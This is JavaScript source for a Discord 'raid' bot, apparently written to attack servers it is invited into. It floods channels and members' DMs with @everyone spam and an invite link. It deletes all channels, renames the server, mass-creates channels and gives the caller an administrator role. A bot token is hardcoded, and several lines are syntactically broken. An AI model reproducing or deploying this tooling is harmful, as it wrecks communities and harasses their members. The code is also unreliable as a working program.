const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "NjI3NTA4NzcxOTQ5OTAzODcz.XZAAQw.wQqZkp1cidypqU_H8InaVv1HHng";
var prefix = ".";


bot.on('message', msg => {


  if (msg.content === '.ping') {
    msg.reply('Pong !')
  }


  if (msg.content === '.ez') {
    console.log(`Commande .des par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone @here RAID BY ZEYZZ ❤️
https://discord.gg/kdzwFne
");
     }, 500);
  }


  if (msg.content === '.des') {
            console.log(`Commande .mp par ${msg.author.tag}`);
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.
                forEach(member => {
                  setInterval(function () {
                    member.send(msg.guild.owner.user.username+" s'est fait bz son serv par ZeyZz ❤️
                   ").catch(error => {}) }, 450)})
  }



if (msg.content === '.del'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }

  if (msg.content === '.des') {
    console.log(`Commande .des par ${msg.author.tag}`);

    if (.fucked){
       msg.guild.setName('Je suis supérieur à vous').catch(e => {});

      for (var i = 0; i < 390; i++) {
        msg.guild.createChannel('ura > all', 'voice').catch(e => {});
        msg.guild.createChannel('Purification_by_ZeyZz', 'text').catch(e => {});
      }
      fucked = true;
            }

    if (msg.deletable) {
      msg.delete();
    }
  }



  if (msg.content === '.r') {
    console.log(`Commande .r par ${msg.author.tag}`);

    msg.member.guild.createRole({
      name: "bandedepute",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }

});
bot.on("message", msg => {
        if(msg.content.startsWith(".des")){
           msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('"@everyone @here RAID BY ZEYZZ ❤️
                https://discord.gg/kdzwFne    ')
              }, 2500);
            });
          }
        });

bot.login("NjI3NTA4NzcxOTQ5OTAzODcz.XZAAQw.wQqZkp1cidypqU_H8InaVv1HHng")